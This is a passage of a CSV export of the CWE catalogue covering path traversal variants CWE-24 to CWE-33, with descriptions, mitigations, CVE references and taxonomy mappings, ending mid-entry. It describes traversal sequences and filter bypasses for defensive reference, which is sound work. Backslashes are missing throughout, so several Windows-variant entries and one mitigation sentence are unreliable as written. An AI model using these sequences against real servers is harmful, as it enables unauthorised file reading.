PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2022-45918:DESCRIPTION:Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using ../ sequences (CWE-24):LINK:https://www.cve.org/CVERecord?id=CVE-2022-45918::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'../filedir::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n25,\"Path Traversal: '/../filedir'\",Variant,Incomplete,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize /../ sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. Sometimes a program checks for ../ at the beginning of the input, so a /../ can bypass that check.\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2022-20775:DESCRIPTION:A cloud management tool allows attackers to bypass the restricted shell using path traversal sequences like /../ in the USER environment variable.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-20775::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'/../filedir::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n26,\"Path Traversal: '/dir/../filename'\",Variant,Draft,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize /dir/../filename sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. The '/dir/../filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only checks for ../ at the beginning of the input, so a /../ can bypass that check.\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:Web Server:TECHNOLOGY PREVALENCE:Often::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'/directory/../filename::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n27,\"Path Traversal: 'dir/../../filename'\",Variant,Draft,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize multiple internal ../ sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. The 'directory/../../filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only removes one ../ sequence, so multiple ../ can bypass that check. Alternately, this manipulation could be used to bypass a check for ../ at the beginning of the pathname, moving up more than one directory level.\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-0298:DESCRIPTION:Server allows remote attackers to cause a denial of service via certain HTTP GET requests containing a %2e%2e (encoded dot-dot), several /../ sequences, or several ../ in a URI.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0298::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'directory/../../filename::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n28,\"Path Traversal: '..filedir'\",Variant,Incomplete,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize .. sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. The '..' manipulation is the canonical manipulation for operating systems that use as directory separators, such as Windows. However, it is also useful for bypassing path traversal protection schemes that only assume that the / separator is valid.\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-0661:DESCRIPTION:not in denylist for web server, allowing path traversal attacks when the server is run in Windows and other OSes.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0661::REFERENCE:CVE-2002-0946:DESCRIPTION:Arbitrary files may be read files via .. (dot dot) sequences in an HTTP request.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0946::REFERENCE:CVE-2002-1042:DESCRIPTION:Directory traversal vulnerability in search engine for web server allows remote attackers to read arbitrary files via .. sequences in queries.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1042::REFERENCE:CVE-2002-1209:DESCRIPTION:Directory traversal vulnerability in FTP server allows remote attackers to read arbitrary files via .. sequences in a GET request.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1209::REFERENCE:CVE-2002-1178:DESCRIPTION:Directory traversal vulnerability in servlet allows remote attackers to execute arbitrary commands via .. sequences in an HTTP request.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1178::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'..filename' ('dot dot backslash')::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n29,\"Path Traversal: '..filename'\",Variant,Incomplete,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '..filename' (leading backslash dot dot) sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. This is similar to CWE-25, except using instead of /. Sometimes a program checks for .. at the beginning of the input, so a .. can bypass that check. It is also useful for bypassing path traversal protection schemes that only assume that the / separator is valid.\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-1987:DESCRIPTION:Protection mechanism checks for /.. but doesn't account for Windows-specific .. allowing read of arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1987::REFERENCE:CVE-2005-2142:DESCRIPTION:Directory traversal vulnerability in FTP server allows remote authenticated attackers to list arbitrary directories via a .. sequence in an LS command.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2142::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'..filename' ('leading dot dot backslash')::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n30,\"Path Traversal: 'dir..filename'\",Variant,Draft,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize 'dir..filename' (leading backslash dot dot) sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. This is similar to CWE-26, except using instead of /. The 'dir..filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only checks for .. at the beginning of the input, so a .. can bypass that check.\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-1987:DESCRIPTION:Protection mechanism checks for /.. but doesn't account for Windows-specific .. allowing read of arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1987::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:7 - 'directory..filename::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n31,\"Path Traversal: 'dir....filename'\",Variant,Draft,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize 'dir....filename' (multiple internal backslash dot dot) sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. The 'dir....filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only removes one .. sequence, so multiple .. can bypass that check. Alternately, this manipulation could be used to bypass a check for .. at the beginning of the pathname, moving up more than one directory level.\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2002-0160:DESCRIPTION:The administration function in Access Control Server allows remote attackers to read HTML, Java class, and image files outside the web root via a .... sequence in the URL to port 2002.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0160::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:8 - 'directory....filename::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"\",\n32,\"Path Traversal: '...' (Triple Dot)\",Variant,Incomplete,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '...' (triple dot) sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. The '...' manipulation is useful for bypassing some path traversal protection schemes. On some Windows systems, it is equivalent to .... and might bypass checks that assume only two dots are valid. Incomplete filtering, such as removal of ./ sequences, can ultimately produce valid .. sequences due to a collapse into unsafe value (CWE-182).\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2001-0467:DESCRIPTION:... in web server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0467::REFERENCE:CVE-2001-0615:DESCRIPTION:... or .... in chat server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0615::REFERENCE:CVE-2001-0963:DESCRIPTION:... in cd command in FTP server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0963::REFERENCE:CVE-2001-1193:DESCRIPTION:... in cd command in FTP server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1193::REFERENCE:CVE-2001-1131:DESCRIPTION:... in cd command in FTP server:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1131::REFERENCE:CVE-2001-0480:DESCRIPTION:read of arbitrary files and directories using GET or CD with ... in Windows-based FTP server.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0480::REFERENCE:CVE-2002-0288:DESCRIPTION:read files using . and Unicode-encoded / or characters in the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0288::REFERENCE:CVE-2003-0313:DESCRIPTION:Directory listing of web server using ...:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0313::REFERENCE:CVE-2005-1658:DESCRIPTION:Triple dot:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1658::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:'...' (triple dot)::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::\",,\"::TYPE:Maintenance:NOTE:This manipulation-focused entry is currently hiding two distinct weaknesses, so it might need to be split. The manipulation is effective in two different contexts: it is equivalent to .... on Windows, or it can take advantage of incomplete filtering, e.g. if the programmer does a single-pass removal of ./ in a string (collapse of data into unsafe value, CWE-182).::\",\n33,\"Path Traversal: '....' (Multiple Dot)\",Variant,Incomplete,\"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '....' (multiple dot) sequences that can resolve to a location that is outside of that directory.\",\"This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory. The '....' manipulation is useful for bypassing some path traversal protection schemes. On some Windows systems, it is equivalent to ...... and might bypass checks that assume only two dots are valid. Incomplete filtering, such as removal of ./ sequences, can ultimately produce valid .. sequences due to a collapse into unsafe value (CWE-182).\",::NATURE:ChildOf:CWE ID:23:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2000-0240:DESCRIPTION:read files via /........../ in URL:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0240::REFERENCE:CVE-2000-0773:DESCRIPTION:read files via .... in web server:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0773::REFERENCE:CVE-1999-1082:DESCRIPTION:read files via ...... in web server (doubled triple dot?):LINK:https://www.cve.org/CVERecord?id=CVE-1999-1082::REFERENCE:CVE-2004-2121:DESCRIPTION:read files via ...... in web server (doubled triple dot?):LINK:https://www.cve.org/CVERecord?id=CVE-2004-2121::REFERENCE:CVE-2001-0491:DESCRIPTION:multiple attacks using .., ..., and .... in different 